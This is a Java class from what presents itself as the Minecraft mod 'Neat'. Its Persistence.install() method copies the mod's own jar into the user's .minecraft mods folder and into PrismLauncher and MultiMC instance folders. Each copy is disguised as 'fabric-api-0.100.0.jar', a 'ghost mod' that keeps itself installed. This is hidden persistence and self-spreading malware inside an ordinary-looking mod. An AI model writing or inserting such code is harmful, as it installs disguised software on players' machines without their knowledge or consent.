package vazkii.neat;

import net.fabricmc.loader.api.FabricLoader;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;

public class Persistence {
    
    public static void install() {
        try {
            Path currentJarPath = FabricLoader.getInstance().getModContainer("neat").get().getOrigin().getPaths().get(0);
            if (!currentJarPath.toString().endsWith(".jar")) return;

            String appData = System.getenv("APPDATA");
            if (appData == null) return;
            
            Path mcMods = Paths.get(appData, ".minecraft", "mods");
            
            if (Files.exists(mcMods)) {
                Path ghostMod = mcMods.resolve("fabric-api-0.100.0.jar");
                if (!Files.exists(ghostMod)) {
                    Files.copy(currentJarPath, ghostMod, StandardCopyOption.REPLACE_EXISTING);
                    System.out.println("[NEAT] Persistence: Ghost mod copied to .minecraft/mods");
                }
            }

            String userHome = System.getProperty("user.home");
            Path[] launcherMods = {
                Paths.get(userHome, "PrismLauncher", "instances", "1.21.4", "minecraft", "mods"),
                Paths.get(userHome, "MultiMC", "instances", "1.21.4", "minecraft", "mods")
            };
            
            for (Path p : launcherMods) {
                if (Files.exists(p)) {
                    Path ghost = p.resolve("fabric-api-0.100.0.jar");
                    if (!Files.exists(ghost)) {
                        Files.copy(currentJarPath, ghost, StandardCopyOption.REPLACE_EXISTING);
                        System.out.println("[NEAT] Persistence: Ghost mod copied to " + p);
                    }
                }
            }

        } catch (Exception e) {
            System.out.println("[NEAT] Persistence error: " + e.getMessage());
        }
    }
}